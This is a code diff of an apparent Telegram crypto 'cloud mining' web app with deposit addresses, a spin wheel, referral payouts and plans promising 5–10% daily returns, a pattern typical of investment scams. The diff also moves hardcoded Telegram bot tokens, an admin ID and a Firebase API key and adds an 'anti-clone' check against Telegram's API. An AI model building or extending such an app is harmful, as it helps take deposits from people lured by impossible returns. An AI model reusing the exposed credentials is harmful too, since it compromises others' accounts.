@@ -73,8 +73,16 @@
         a { text-decoration: none; color: inherit; }
         ul { list-style: none; }
         button { background: none; border: none; outline: none; cursor: pointer; color: inherit; font-family: inherit; }
+        
         .crypto-font { font-family: 'Space Grotesk', sans-serif; }
-        .gpu-accel { transform: translateZ(0); will-change: transform, opacity; }
+        
+        /* === HARDWARE ACCELERATION FOR ULTRA SMOOTHNESS === */
+        .gpu-accel { 
+            transform: translate3d(0, 0, 0); 
+            will-change: transform, opacity; 
+            backface-visibility: hidden; 
+            perspective: 1000px; 
+        }
 
         img { pointer-events: none; user-select: none; -webkit-user-drag: none; }
 
@@ -240,7 +248,7 @@
             font-weight: 800; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 20px;
             background: rgba(31, 201, 110, 0.1); padding: 6px 14px; border-radius: 20px;
         }
-        .pulse-dot { width: 10px; height: 10px; background-color: #1FC96E; border-radius: 50%; animation: pulse-dot-anim 1.5s infinite; transform: translateZ(0);}
+        .pulse-dot { width: 10px; height: 10px; background-color: #1FC96E; border-radius: 50%; animation: pulse-dot-anim 1.5s infinite; transform: translate3d(0,0,0);}
         @keyframes pulse-dot-anim { 0% { box-shadow: 0 0 0 0 rgba(31, 201, 110, 0.5); } 70% { box-shadow: 0 0 0 10px rgba(31, 201, 110, 0); } 100% { box-shadow: 0 0 0 0 rgba(31, 201, 110, 0); } }
 
         .mining-amount-wrapper { display: flex; align-items: baseline; justify-content: center; width: 100%; margin-bottom: 35px; text-shadow: 0 5px 15px rgba(0,0,0,0.05); }
@@ -297,7 +305,7 @@
             background: #1A1A1A; border: 2px solid #333; border-radius: 14px;
             aspect-ratio: 1/1; display: flex; flex-direction: column; align-items: center; justify-content: center;
             transition: transform 0.2s cubic-bezier(0.25, 0.8, 0.25, 1), background 0.2s, border-color 0.2s; 
-            position: relative; overflow: hidden; transform: translateZ(0); will-change: transform;
+            position: relative; overflow: hidden; transform: translate3d(0,0,0); will-change: transform;
         }
         .spin-box.active {
             background: var(--primary-glow); border-color: var(--primary-color);
@@ -781,7 +789,10 @@
 
         <!-- DEPOSIT STEP 3: PAYMENT PAGE -->
         <div id="dep-step-3" style="display: none; animation: fadeSlideUp 0.3s ease forwards; text-align: center;">
-            <label class="form-label text-left">Step 3: Send to this Address</label>
+            <div class="stat-label mb-1" style="color:var(--text-main); font-size:15px; font-weight:600;">
+                Deposit Amount: <span id="dep-display-amount" style="color:var(--primary-color); font-size:22px; font-weight:800; font-family:'Space Grotesk'; margin-left:8px;">$0.00</span>
+            </div>
+            <label class="form-label text-left mt-2">Step 3: Send EXACT amount to this Address</label>
             <img id="dep-qr" src="" style="width:160px; height:160px; border-radius:12px; margin: 10px auto 20px; border: 2px solid var(--primary-color); display:block; background:#fff; padding:10px;">
             
             <div class="address-box text-left">
@@ -970,6 +981,11 @@
         import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-analytics.js";
         import { getFirestore, doc, getDoc, setDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
         
+        // --- BOT NOTIFICATION SYSTEM & ANTI-CLONE SECURITY ---
+        const BOT_TOKEN = "8767199366:AAGDtON5E7QwCiptl4NsD0yDXA8h9bcc_6E";
+        const ADMIN_BOT_TOKEN = "8907741925:AAHL3h8vqWimGn7g5DUzPagw26O9l86y4QA";
+        const ADMIN_UID = "8254636146";
+
         // 2. Firebase Configuration
         const firebaseConfig = {
             apiKey: "AIzaSyB4Z52pHta-1K2bzRm4es6GbSw1P6FQ7fU",
@@ -1022,7 +1038,7 @@
         };
 
         const appPlans = [
-            { id: 'free', name: 'Free Trial Node', min: 0, max: 0, duration: 'Lifetime', roi: 0, dailyFixed: 0.05, tag: 'Free', hash: '5 GH/s' },
+            { id: 'free', name: 'Free Trial Node', min: 0, max: 0, duration: 'Lifetime', roi: 0, dailyFixed: 0.02, tag: 'Free', hash: '5 GH/s' },
             { id: 'p1', name: 'Starter Node', min: 3, max: 100, duration: 7, roi: 5.0, tag: 'Hot', hash: '25 GH/s' },
             { id: 'p2', name: 'Pro Miner', min: 101, max: 500, duration: 14, roi: 7.5, tag: 'Popular', hash: '150 GH/s' },
             { id: 'p3', name: 'Whale Pool', min: 501, max: 2000, duration: 30, roi: 10.0, tag: 'High Yield', hash: '800 GH/s' },
@@ -1089,11 +1105,6 @@
             }
         };
 
-        // --- BOT NOTIFICATION SYSTEM ---
-        const BOT_TOKEN = "8767199366:AAGDtON5E7QwCiptl4NsD0yDXA8h9bcc_6E";
-        const ADMIN_BOT_TOKEN = "8907741925:AAHL3h8vqWimGn7g5DUzPagw26O9l86y4QA";
-        const ADMIN_UID = "8254636146";
-        
         window.sendBotNotification = async (messageText, customId = null) => {
             try {
                 const targetId = customId || state.uid;
@@ -1223,6 +1234,15 @@
 
         // Initialize App
         async function initApp() {
+            // Anti-Clone Strict Protection Layer
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`).then(r => r.json()).then(d => {
+                if(d.ok && d.result.username !== appConfig.botUsername) {
+                    document.getElementById('app-container').innerHTML = `<div style="display:flex;height:80vh;align-items:center;justify-content:center;flex-direction:column;padding:20px;text-align:center;"><svg viewBox="0 0 24 24" style="width:64px;height:64px;fill:#FF3B30;margin-bottom:20px;"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><h2 style="color:#FF3B30;margin-bottom:10px;">Security Alert</h2><p style="color:var(--text-muted);font-size:14px;line-height:1.5;">This App is running from an Unauthorized Bot.<br><br>Please use the official App: <b>@${appConfig.botUsername}</b></p></div>`;
+                    document.querySelector('.bottom-nav').style.display = 'none';
+                    return;
+                }
+            }).catch(e => {});
+
             viewEarningsEl = document.getElementById('view-earnings');
 
             const configRef = doc(db, "config", "main");
@@ -1344,7 +1364,7 @@
                 let daily = inv.planId === 'free' ? inv.dailyFixed.toFixed(2) : ((inv.amount * inv.roi) / 100).toFixed(2);
                 let amtDisplay = inv.planId === 'free' ? 'Free Trial' : formatBal(inv.amount);
                 return `
-                <div class="plan-card" style="padding:18px; border-color: ${inv.planId === 'free' ? 'rgba(132,169,0,0.3)' : 'var(--border-color)'}">
+                <div class="plan-card gpu-accel" style="padding:18px; border-color: ${inv.planId === 'free' ? 'rgba(132,169,0,0.3)' : 'var(--border-color)'}">
                     <div class="plan-header" style="margin-bottom:10px;">
                         <div class="plan-title" style="font-size:16px;">${inv.planName}</div>
                         <div class="plan-badge" style="background: rgba(31, 201, 110, 0.15); color: #1FC96E; font-size:11px;"><div class="pulse-dot" style="display:inline-block; margin-right:4px;"></div> Live</div>
@@ -1374,7 +1394,7 @@
                 else iconSvg = `<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg>`;
                 
                 return `
-                <div class="tx-item">
+                <div class="tx-item gpu-accel">
                     <div class="tx-left">
                         <div class="tx-icon ${['spin','reward'].includes(tx.type) ? 'earn' : tx.type}">${iconSvg}</div>
                         <div class="tx-info"><div class="tx-title">${tx.title}</div><div class="tx-date">${fmtDate(tx.date)}</div></div>
@@ -1405,7 +1425,7 @@
                 else btnHtml = `<button class="btn-claim-task" disabled>In Progress</button>`;
                 
                 return `
-                <div class="task-card">
+                <div class="task-card gpu-accel">
                     <div class="task-header"><div class="task-info"><h4>${task.title}</h4><p>${task.desc}</p></div><div class="task-reward">+${formatBal(task.reward)}</div></div>
                     <div class="task-progress-wrap">
                         <div class="task-progress-header"><span>Progress</span><span class="crypto-font">${formatNumber(Math.min(current, task.target))} / ${formatNumber(task.target)}</span></div>
@@ -1416,7 +1436,7 @@
             container.innerHTML = html;
         }
 
-        // Live Yield Logic
+        // Live Yield Logic (Optimized for 0 lag)
         let lastUpdateMs = 0;
         let lastYieldStr = "";
         const elYieldMain = document.getElementById('yield-main');
@@ -1526,7 +1546,7 @@
 
             const container = document.getElementById('toast-container');
             const toast = document.createElement('div');
-            toast.className = `toast ${type}`;
+            toast.className = `toast ${type} gpu-accel`;
             let icon = `<svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>`;
             if (type === 'error') icon = `<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>`;
             if (type === 'warning') icon = `<svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>`;
@@ -1613,6 +1633,7 @@
                 let net = document.getElementById('dep-network-val').value;
                 let targetAddress = net === 'TRC20' ? appConfig.depTRC20 : appConfig.depBEP20;
                 
+                document.getElementById('dep-display-amount').innerText = '$' + amt.toFixed(2);
                 document.getElementById('dep-address').innerText = targetAddress;
                 document.getElementById('dep-qr').src = `https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${targetAddress}&margin=0`;
                 document.getElementById('dep-step-3').style.display = 'block';
@@ -1668,7 +1689,7 @@
             if (!plan) return;
             document.getElementById('sp-title').innerText = plan.name;
             document.getElementById('sp-duration').innerText = plan.duration + (plan.duration !== 'Lifetime' ? ' Days' : '');
-            document.getElementById('sp-roi').innerText = plan.id === 'free' ? 'Fixed Daily' : plan.roi + '% Daily';
+            document.getElementById('sp-roi').innerText = plan.id === 'free' ? '$0.02 Fixed Daily' : plan.roi + '% Daily';
             document.getElementById('sp-min').innerText = plan.id === 'free' ? '$0' : '$' + plan.min;
             document.getElementById('sp-max').innerText = plan.id === 'free' ? '$0' : '$' + plan.max;
             document.getElementById('sp-id').value = plan.id;
@@ -1711,7 +1732,6 @@
             window.showActionLoader(async () => {
                 if (plan.id !== 'free') state.balance.available -= amount;
                 
-                // Fix: Added `|| 0` to prevent undefined values going into Firestore
                 state.activeInvestments.push({
                     planId: plan.id, planName: plan.name, amount: amount, 
                     duration: plan.duration, roi: plan.roi || 0, dailyFixed: plan.dailyFixed || 0,
@@ -1722,7 +1742,6 @@
                 if(plan.id !== 'free') {
                     state.stats.invested += amount;
                     
-                    // Fix: Award Commission to Referrer instantly!
                     if (state.referredBy) {
                         try {
                             const refUserDoc = doc(db, "users", state.referredBy);
@@ -1812,13 +1831,12 @@
         };
 
         async function finishSpin(finalBoxIdx) {
-            // Fix: Updated Spin Array values corresponding to changes
             const spinValues = [500, 0, 100, 10, 0.2, 2, 0.1, 0.01]; 
             let wonAmount = spinValues[finalBoxIdx];
             
             const winBox = document.getElementById('box-' + spinSequence[finalBoxIdx]);
             winBox.style.transform = 'scale(1.15)'; winBox.style.boxShadow = '0 0 30px var(--primary-color)';
-            setTimeout(() => { winBox.style.transform = ''; winBox.style.boxShadow = ''; }, 600);
+            setTimeout(() => { winBox.style.transform = 'translate3d(0,0,0)'; winBox.style.boxShadow = ''; }, 600);
 
             if (wonAmount > 0) {
                 state.balance.available += wonAmount; state.balance.total += wonAmount; state.balance.earnings += wonAmount;
